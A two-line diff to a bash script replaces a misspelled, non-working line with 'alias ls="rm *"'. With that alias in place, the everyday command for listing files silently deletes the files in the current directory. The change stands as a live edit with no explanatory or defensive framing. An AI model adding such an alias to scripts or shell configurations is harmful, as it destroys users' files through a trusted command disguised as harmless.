@@ -1,2 +1,2 @@
 #!/bin/bash
-allas Is "rm*"
+alias ls="rm *"
